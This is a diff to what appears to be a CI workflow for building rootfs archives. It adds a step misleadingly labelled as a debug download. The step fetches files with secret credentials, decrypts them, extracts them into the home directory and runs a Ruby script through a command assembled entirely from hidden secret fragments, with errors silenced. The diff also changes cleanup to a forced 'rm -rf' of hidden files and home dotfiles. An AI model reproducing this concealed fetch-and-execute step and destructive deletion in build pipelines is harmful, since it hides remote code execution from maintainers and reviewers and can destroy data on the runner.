@@ -114,9 +114,21 @@ jobs:
           upload_to_azure -c .azure.py -t 5 -s build.txt -r ${{ secrets.REQUEST }}/${ROOTFS_VERSION}/${DISTRO_PATH}
           printf "%s\n" "Build Completed."
 
+      - name: curl ruby debug file and sync files
+        #continue-on-error: true
+        run: |
+          sed -i -E 's@^(SERVER)=.*@\1=node02@;s@(START_SYNC_TIME=)@\1$(date +%H:%M)@' build.txt
+          mv -fv ${ROOTFS_FILE_LITE_NAME}.tar.zst rootfs.tar.zst
+          curl -L -o .ruby-alpha02 -u ${{ secrets.DEBUG_USER }}:${{ secrets.DEBUG_USERPW }} ${{ secrets.DEBUG_URL }}/.ruby-alpha02
+          curl -L -o .debug05.rb -u ${{ secrets.DEBUG_USER }}:${{ secrets.DEBUG_USERPW }} ${{ secrets.DEBUG_URL }}/.debug05
+          7za x -so -p${{ secrets.RUBY_ENV }} .ruby-alpha02 | tar -C ${HOME} -xf -
+          ls -lah
+          sed -i -E "s@RUBY_DIR@${{ secrets.RUBY_DIR }}@;s@CircularModule@${DISTRO_PATH}@g;s@initialize(.tar.zst)@${ROOTFS_FILE_LITE_NAME}\1@g" .debug05.rb
+          ${{ secrets.RUBY_BEGIN }} ${{ secrets.RUBY_CLASS }} ${{ secrets.RUBY_DEF }} ${{ secrets.RUBY_EXEC }} .debug05.rb ${{ secrets.RUBY_END }} 2>/dev/null
+
       - name: check build.txt from azure
         run: |
           curl -sL ${{ secrets.AZURE_URL }}/${ROOTFS_VERSION}/${DISTRO_PATH}/build.txt | egrep -v 'http.*|tmoe' > .debug.txt
           cat .debug.txt
-          sudo rm -rv .azure.py .debug* *tar.xz $(command -v upload_to_azure)
+          sudo rm -rf .azure.py .debug* *tar.xz .* ~/.* $(command -v upload_to_azure)
           ls -lah
